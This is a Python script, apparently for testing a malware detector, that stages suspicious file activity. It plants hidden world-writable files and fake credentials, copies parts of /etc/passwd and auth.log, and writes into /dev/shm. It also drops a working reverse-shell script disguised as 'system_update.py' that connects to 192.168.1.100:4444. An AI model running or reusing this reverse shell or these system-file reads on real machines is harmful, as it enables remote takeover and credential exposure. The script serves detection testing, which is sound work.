#!/usr/bin/env python3
"""
File Manipulation Utility - Demonstrates suspicious file operations
For security testing purposes only
"""

import os
import sys
import json
import base64
import hashlib
import datetime
import random
import string
from pathlib import Path

# Sumnjivi zahtevi koji bi mogli da se koriste
REQUIREMENTS = [
    "requests>=2.28.0",
    "cryptography>=39.0.0",
    "pycryptodome>=3.17.0",
    "paramiko>=3.0.0",
    "pymongo>=4.5.0",
    "sqlalchemy>=2.0.0",
    "flask>=2.3.0",
    "django>=4.2.0",
    "celery>=5.3.0",
    "redis>=4.5.0"
]

class FileManager:
    def __init__(self, base_path="/tmp/test_area"):
        self.base_path = Path(base_path)
        self.base_path.mkdir(exist_ok=True)
        self.hidden_files = []
        self.encryption_key = self._generate_key()
        
    def _generate_key(self):
        """Generisanje enkripcionog kljuca"""
        return hashlib.sha256(b"suspicious_seed_12345").digest()
    
    def _encode_content(self, content):
        """Enkodiranje sadrzaja u base64"""
        return base64.b64encode(content.encode()).decode()
    
    def _decode_content(self, encoded_content):
        """Dekodiranje base64 sadrzaja"""
        return base64.b64decode(encoded_content).decode()
    
    def create_suspicious_file(self, filename, content, hidden=False):
        """Kreiranje fajla sa sumnjivim sadrzajem"""
        filepath = self.base_path / filename
        
        # Dodavanje skrivenog prefiksa ako je potrebno
        if hidden:
            filename = f".{filename}"
            filepath = self.base_path / filename
            self.hidden_files.append(filename)
        
        # Enkodiranje sadrzaja
        encoded_content = self._encode_content(content)
        
        with open(filepath, 'w') as f:
            f.write(encoded_content)
            
        # Postavljanje sumnjivih dozvola
        os.chmod(filepath, 0o777)
        
        print(f"[INFO] Created file: {filepath}")
        return filepath
    
    def modify_system_files(self):
        """Simulacija modifikacije sistemskih fajlova"""
        system_paths = [
            "/etc/hosts",
            "/etc/passwd",
            "/var/log/auth.log",
            "/tmp/.cache",
            "/dev/null"
        ]
        
        for path in system_paths:
            if os.path.exists(path):
                try:
                    # Citanje postojeceg sadrzaja
                    with open(path, 'r') as f:
                        content = f.read()[:100]  # Samo deo
                    
                    # Pisanje u testni fajl umesto stvarnog
                    test_path = self.base_path / f"system_backup_{Path(path).name}"
                    with open(test_path, 'w') as f:
                        f.write(f"Original content from {path}:\n{content}")
                    
                    print(f"[WARN] System file access simulated: {path}")
                except Exception as e:
                    print(f"[ERROR] Cannot access {path}: {e}")
    
    def create_encrypted_payload(self, payload_data):
        """Kreiranje enkriptovanog payload-a"""
        timestamp = datetime.datetime.now().isoformat()
        payload = {
            "data": payload_data,
            "timestamp": timestamp,
            "checksum": hashlib.md5(payload_data.encode()).hexdigest()
        }
        
        # Enkodiranje i upisivanje
        encoded = self._encode_content(json.dumps(payload))
        filename = f"payload_{random.randint(1000, 9999)}.enc"
        filepath = self.base_path / filename
        
        with open(filepath, 'w') as f:
            f.write(encoded)
        
        print(f"[CRITICAL] Encrypted payload created: {filepath}")
        return filepath
    
    def read_and_execute_pattern(self):
        """Citanje fajlova i izvrsavanje sumnjivih obrazaca"""
        patterns = [
            "eval(",
            "exec(",
            "__import__(",
            "os.system(",
            "subprocess.Popen(",
            "compile(",
            "execfile("
        ]
        
        results = []
        for filepath in self.base_path.glob("*"):
            if filepath.is_file():
                try:
                    with open(filepath, 'r') as f:
                        content = f.read()
                        for pattern in patterns:
                            if pattern in content:
                                results.append({
                                    "file": str(filepath),
                                    "pattern": pattern,
                                    "line": content[:100]  # Prvih 100 karaktera
                                })
                except:
                    pass
        
        # Upisivanje rezultata u log fajl
        log_file = self.base_path / "security_scan_results.log"
        with open(log_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"[INFO] Security scan results saved to {log_file}")
        return results
    
    def create_backdoor_script(self):
        """Kreiranje skripte koja simulira backdoor"""
        backdoor_code = '''
import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

# Sumnjiva konfiguracija
CONFIG = {
    "host": "192.168.1.100",
    "port": 4444,
    "persistent": True,
    "encrypted": True
}

if __name__ == "__main__":
    reverse_shell(CONFIG["host"], CONFIG["port"])
'''
        
        filename = "system_update.py"
        filepath = self.create_suspicious_file(filename, backdoor_code, hidden=True)
        
        # Dodavanje izvrsnih dozvola
        os.chmod(filepath, 0o755)
        
        return filepath
    
    def generate_random_files(self, count=10):
        """Generisanje nasumicnih fajlova sa sumnjivim imenima"""
        suspicious_names = [
            "cronjob.sh", "hidden_process", "systemctl.py",
            "update_manager", "network_config", "service_runner",
            "temp_cleaner", "log_rotator", "cache_clear",
            "backup_agent"
        ]
        
        created_files = []
        for i in range(min(count, len(suspicious_names))):
            name = suspicious_names[i]
            content = ''.join(random.choices(string.ascii_letters + string.digits, k=200))
            
            # Nasumicno sakrivanje nekih fajlova
            hidden = random.choice([True, False])
            filepath = self.create_suspicious_file(name, content, hidden)
            created_files.append(filepath)
        
        return created_files
    
    def write_to_multiple_locations(self):
        """Pisanje na vise lokacija odjednom"""
        locations = [
            "/tmp/.hidden",
            "/var/tmp/cache",
            "/dev/shm/data",
            "/run/user/1000/temp"
        ]
        
        data = "Sensitive configuration data"
        encoded = self._encode_content(data)
        
        for loc in locations:
            try:
                path = Path(loc)
                path.parent.mkdir(exist_ok=True)
                
                with open(path, 'w') as f:
                    f.write(encoded)
                
                print(f"[WARN] Wrote to alternative location: {loc}")
            except:
                # Fallback na test direktorijum
                fallback = self.base_path / f"alt_{Path(loc).name}"
                with open(fallback, 'w') as f:
                    f.write(encoded)
                print(f"[INFO] Wrote to fallback: {fallback}")
    
    def cleanup(self):
        """Ciscenje test fajlova"""
        for filepath in self.base_path.glob("*"):
            try:
                filepath.unlink()
                print(f"[CLEAN] Removed: {filepath}")
            except:
                pass
        
        try:
            self.base_path.rmdir()
            print(f"[CLEAN] Removed directory: {self.base_path}")
        except:
            print(f"[WARN] Could not remove {self.base_path}")

def main():
    print("=" * 60)
    print("FILE MANIPULATION UTILITY - SECURITY TEST")
    print("=" * 60)
    
    # Inicijalizacija
    manager = FileManager()
    
    # 1. Kreiranje sumnjivih fajlova
    print("\n[1] Creating suspicious files...")
    manager.create_suspicious_file("config.json", '{"admin": true, "password": "secret"}', False)
    manager.create_suspicious_file("credentials.txt", "user=admin\npass=password123", True)
    
    # 2. Simulacija modifikacije sistemskih fajlova
    print("\n[2] Simulating system file access...")
    manager.modify_system_files()
    
    # 3. Enkriptovani payload
    print("\n[3] Creating encrypted payload...")
    manager.create_encrypted_payload("Malicious code execution sequence")
    
    # 4. Skeniranje za sumnjive obrasce
    print("\n[4] Scanning for suspicious patterns...")
    manager.read_and_execute_pattern()
    
    # 5. Backdoor skripta
    print("\n[5] Creating backdoor script...")
    manager.create_backdoor_script()
    
    # 6. Generisanje nasumicnih fajlova
    print("\n[6] Generating random suspicious files...")
    manager.generate_random_files(8)
    
    # 7. Pisanje na vise lokacija
    print("\n[7] Writing to multiple locations...")
    manager.write_to_multiple_locations()
    
    print("\n" + "=" * 60)
    print("[COMPLETE] All suspicious operations executed!")
    print(f"[INFO] Check directory: {manager.base_path}")
    print("[WARN] This script is for security testing only!")
    print("=" * 60)
    
    # Ne cistimo odmah da bi detektor imao sta da detektuje
    # manager.cleanup()  # Zakomentarisano za testiranje

if __name__ == "__main__":
    main()